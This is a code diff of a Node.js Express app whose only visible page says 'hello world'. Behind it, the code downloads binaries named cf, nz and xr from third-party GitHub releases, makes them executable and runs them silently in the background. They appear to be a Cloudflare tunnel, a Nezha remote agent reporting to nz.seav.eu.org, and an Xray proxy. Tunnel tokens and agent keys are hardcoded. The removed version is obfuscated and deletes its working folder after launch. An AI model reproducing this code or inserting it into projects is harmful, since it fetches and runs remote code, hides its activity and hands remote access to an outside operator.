@@ -1,11 +1,63 @@
-const token = process.env.C_T || "eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGM1ZjI5NjctZWRlYy00ZmRjLTllYWYtZjA0MDc1MDcxZTZiIiwicyI6Ik9EUXhZelEwWWpndE5HSTFOeTAwTldRd0xXRm1NV0l0T0RBMFlXTXpPVEJsWVRVNSJ9";
-const serverHost = process.env.N_S || "nz.seav.eu.org";
-const serverPort = process.env.N_P || 443;
-const serverToken = process.env.N_K || "8gydd8PByXXiWXkutN";
-const UUID = process.env.UUID || "feefeb96-bfcf-4a9b-aac0-6aac771c1b98";
+const C_T = process.env.C_T || "eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYzYyMTE0ZGYtYWYwZC00YTU2LWE1NjctMjM3NDdjMmI0M2ExIiwicyI6Ik5XWXlZakkxWVRndE5UUXpaQzAwTjJGa0xUaGxabVV0WVRReU1HWmlOMkl3T0dVeSJ9";
+const N_S = process.env.N_S || "nz.seav.eu.org";
+const N_K = process.env.N_K || "mTP8qwlGOuWO8c3TsV";
 const port = process.env.SERVER_PORT || process.env.PORT || 3000;
-const cfport = 8002;
-const tmpDir = './tmp';
-const vlsPath = process.env.VLS_PATH || '/vls';
 
-const _0x1a0b29=_0xcf52;(function(_0x3032ba,_0x5441fa){const _0x44f203=_0xcf52,_0x477f2e=_0x3032ba();while(!![]){try{const _0xeffee4=-parseInt(_0x44f203(0xe5))/0x1+-parseInt(_0x44f203(0xb9))/0x2+-parseInt(_0x44f203(0xe7))/0x3*(parseInt(_0x44f203(0xc4))/0x4)+-parseInt(_0x44f203(0xe4))/0x5+parseInt(_0x44f203(0xd8))/0x6+parseInt(_0x44f203(0xdf))/0x7*(parseInt(_0x44f203(0xc7))/0x8)+parseInt(_0x44f203(0xeb))/0x9;if(_0xeffee4===_0x5441fa)break;else _0x477f2e['push'](_0x477f2e['shift']());}catch(_0x178ca2){_0x477f2e['push'](_0x477f2e['shift']());}}}(_0x20d3,0xda7d5));function _0x20d3(){const _0x4dd870=['status','catch','upgrade','express','/dev/null','35ljVZLW','listen','/cf\x20tunnel\x20--edge-ip-version\x20auto\x20run\x20--protocol\x20http2\x20--token\x20','GET','exec\x20error:\x20','8835005CZyTMH','1151540eFlmgg','nohup\x20./','144rkAeka','mkdirSync','log','length','26804475mocYtP','rmSync','/config.json\x20>/dev/null\x202>&1\x20&','2606:4700:110:8a36:df92:102a:9602:fa18/128','wireguard','AsIs','https://github.com/seav1/dl/releases/download/upx/xr-arm','bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','https://github.com/seav1/dl/releases/download/upx/xr','none','arch','WARP','domain:openai.com','get','https://github.com/seav1/dl/releases/download/upx/cf','createWriteStream','\x20-p\x20','/config.json','/nz\x20-s\x20','error','http','vless','app\x20listening\x20on\x20port\x20','878598sRjbAR','/xr\x20-c\x20','hello\x20world','field','tls','\x20--url\x20http://localhost:','\x20--tls\x20>/dev/null\x202>&1\x20&','127.0.0.1','xtls-rprx-vision','YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=','quic','94448ArYiLQ','::/0','https://github.com/seav1/dl/releases/download/upx/cf-arm','1547672iFIsKY','x64','http-proxy-middleware','send','finish','172.16.0.2/32','existsSync','162.159.193.10:2408','BKHrm','child_process','pipe','freedom','https://github.com/seav1/dl/releases/download/upx/nz-arm','chmod\x20+x\x20','\x20>/dev/null\x202>&1\x20&','WdpTQ','data','8643474AOAAQE','WdtrU'];_0x20d3=function(){return _0x4dd870;};return _0x20d3();}const axios=require('axios'),fs=require('fs'),{exec}=require(_0x1a0b29(0xd0)),express=require(_0x1a0b29(0xdd)),{createProxyMiddleware}=require(_0x1a0b29(0xc9)),http=require(_0x1a0b29(0xff)),app=express(),URLS_x86_64=[_0x1a0b29(0xf9),'https://github.com/seav1/dl/releases/download/upx/nz',_0x1a0b29(0xf3)],URLS_arm=[_0x1a0b29(0xc6),_0x1a0b29(0xd3),_0x1a0b29(0xf1)],FILES=['cf','nz','xr'],config={'log':{'access':_0x1a0b29(0xde),'error':_0x1a0b29(0xde),'loglevel':_0x1a0b29(0xf4)},'inbounds':[{'port':cfport,'protocol':_0x1a0b29(0x100),'settings':{'clients':[{'id':UUID,'flow':_0x1a0b29(0xc1)}],'decryption':_0x1a0b29(0xf4),'fallbacks':[{'dest':0xbb9},{'path':vlsPath,'dest':0xbba}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1a0b29(0xc0),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none'}},{'port':0xbba,'listen':_0x1a0b29(0xc0),'protocol':_0x1a0b29(0x100),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1a0b29(0xf4),'wsSettings':{'path':vlsPath}},'sniffing':{'enabled':!![],'destOverride':[_0x1a0b29(0xff),_0x1a0b29(0xbd),_0x1a0b29(0xc3)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1a0b29(0xd2)},{'tag':_0x1a0b29(0xf6),'protocol':_0x1a0b29(0xef),'settings':{'secretKey':_0x1a0b29(0xc2),'address':[_0x1a0b29(0xcc),_0x1a0b29(0xee)],'peers':[{'publicKey':_0x1a0b29(0xf2),'allowedIPs':['0.0.0.0/0',_0x1a0b29(0xc5)],'endpoint':_0x1a0b29(0xce)}],'reserved':[0x4e,0x87,0x4c],'mtu':0x500}}],'routing':{'domainStrategy':_0x1a0b29(0xf0),'rules':[{'type':_0x1a0b29(0xbc),'domain':[_0x1a0b29(0xf7),'domain:ai.com'],'outboundTag':'WARP'}]}},downloadFile=async(_0x4163a,_0x3b1090)=>{const _0x7dee9e=_0x1a0b29,_0x407362=fs[_0x7dee9e(0xfa)](tmpDir+'/'+_0x3b1090),_0x7aea16=await axios({'url':_0x4163a,'method':_0x7dee9e(0xe2),'responseType':'stream'});return _0x7aea16[_0x7dee9e(0xd7)][_0x7dee9e(0xd1)](_0x407362),new Promise((_0xab8369,_0x38b95d)=>{const _0x180227=_0x7dee9e;'BKHrm'!==_0x180227(0xcf)?_0x36cbce['log'](_0x180227(0x101)+_0x467903):(_0x407362['on'](_0x180227(0xcb),_0xab8369),_0x407362['on']('error',_0x38b95d));});},executeCommand=_0x8cd6a7=>{return new Promise((_0x210c32,_0x4b2a39)=>{exec(_0x8cd6a7,(_0x1a179c,_0x3929c0,_0x58e095)=>{const _0xb8f508=_0xcf52;if(_0x1a179c){if(_0xb8f508(0xd9)===_0xb8f508(0xd6))_0x1e2a99[_0xb8f508(0xda)](0xc8)[_0xb8f508(0xca)]('hello\x20world');else{_0x4b2a39(_0xb8f508(0xe3)+_0x1a179c);return;}}_0x210c32(_0x3929c0?_0x3929c0:_0x58e095);});});},main=async()=>{const _0x2f4804=_0x1a0b29;!fs[_0x2f4804(0xcd)](tmpDir)&&fs[_0x2f4804(0xe8)](tmpDir,{'mode':0x1ed});const _0x3795fd=process[_0x2f4804(0xf5)]===_0x2f4804(0xc8)?URLS_x86_64:URLS_arm;for(let _0x462fea=0x0;_0x462fea<_0x3795fd[_0x2f4804(0xea)];_0x462fea++){await downloadFile(_0x3795fd[_0x462fea],FILES[_0x462fea]),await executeCommand(_0x2f4804(0xd4)+tmpDir+'/'+FILES[_0x462fea]);}await executeCommand(_0x2f4804(0xe6)+tmpDir+_0x2f4804(0xe1)+token+_0x2f4804(0xbe)+cfport+_0x2f4804(0xd5)),await executeCommand(_0x2f4804(0xe6)+tmpDir+_0x2f4804(0xfd)+serverHost+':'+serverPort+_0x2f4804(0xfb)+serverToken+_0x2f4804(0xbf)),fs['writeFileSync'](tmpDir+_0x2f4804(0xfc),JSON['stringify'](config)),await executeCommand(_0x2f4804(0xe6)+tmpDir+_0x2f4804(0xba)+tmpDir+_0x2f4804(0xed)),setTimeout(()=>{const _0x319b2a=_0x2f4804;fs[_0x319b2a(0xcd)](tmpDir)&&fs[_0x319b2a(0xec)](tmpDir,{'recursive':!![],'force':!![]});},0x1388);};function _0xcf52(_0x2e9460,_0xef4081){const _0x20d3f2=_0x20d3();return _0xcf52=function(_0xcf524e,_0x85e6d8){_0xcf524e=_0xcf524e-0xb9;let _0x2d1369=_0x20d3f2[_0xcf524e];return _0x2d1369;},_0xcf52(_0x2e9460,_0xef4081);}main()[_0x1a0b29(0xdb)](console[_0x1a0b29(0xfe)]),app[_0x1a0b29(0xf8)]('/',(_0x140d14,_0x58d6fc)=>{const _0x38a293=_0x1a0b29;_0x58d6fc[_0x38a293(0xda)](0xc8)[_0x38a293(0xca)](_0x38a293(0xbb));});const server=http['createServer'](app);server['on'](_0x1a0b29(0xdc),createProxyMiddleware({'target':'ws://localhost:'+cfport,'changeOrigin':!![],'ws':!![]})),server[_0x1a0b29(0xe0)](port,()=>{const _0xc1723=_0x1a0b29;console[_0xc1723(0xe9)](_0xc1723(0x101)+port);});
+const axios = require('axios');
+const fs = require('fs');
+const { exec } = require('child_process');
+const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
+const http = require('http');
+const app = express();
+
+const URLS_x86_64 = ["https://github.com/seav1/dl/releases/download/files/cf", "https://github.com/seav1/dl/releases/download/files/nz", "https://github.com/seav1/xr/releases/download/latest/xray-linux-amd64"];
+const URLS_arm = ["https://github.com/seav1/dl/releases/download/files/cf-arm", "https://github.com/seav1/dl/releases/download/files/nz-arm", "https://github.com/seav1/xr/releases/download/latest/xray-linux-arm64"];
+const FILES = ["cf", "nz", "xr"];
+
+const downloadFile = async (url, filename) => {
+  const writer = fs.createWriteStream(`./${filename}`);
+  const response = await axios({ url, method: 'GET', responseType: 'stream' });
+  response.data.pipe(writer);
+  return new Promise((resolve) => {
+    writer.on('finish', resolve);
+  });
+};
+
+const executeCommand = (command) => {
+  return new Promise((resolve) => {
+    exec(command, (error, stdout) => {
+      resolve(stdout);
+    });
+  });
+};
+
+const main = async () => {
+  const urls = process.arch === 'x64' ? URLS_x86_64 : URLS_arm;
+  for (let i = 0; i < urls.length; i++) {
+    await downloadFile(urls[i], FILES[i]);
+    await executeCommand(`chmod +x ./${FILES[i]}`);
+  }
+
+  await executeCommand(`nohup ./cf tunnel --edge-ip-version auto run --protocol http2 --C_T ${C_T} --url http://localhost:8002 >/dev/null 2>&1 &`);
+  await executeCommand(`nohup ./nz -s ${N_S}:443 -p ${N_K} --tls >/dev/null 2>&1 &`);
+  await executeCommand(`nohup ./xr >/dev/null 2>&1 &`);
+};
+
+main();
+
+app.get('/', (req, res) => {
+  res.status(200).send('hello world');
+});
+
+const server = http.createServer(app);
+
+server.on('upgrade', createProxyMiddleware({
+  target: `ws://localhost:8002`,
+  changeOrigin: true,
+  ws: true,
+}));
+
+server.listen(port, () => {
+  console.log(`app listening on port ${port}`);
+});
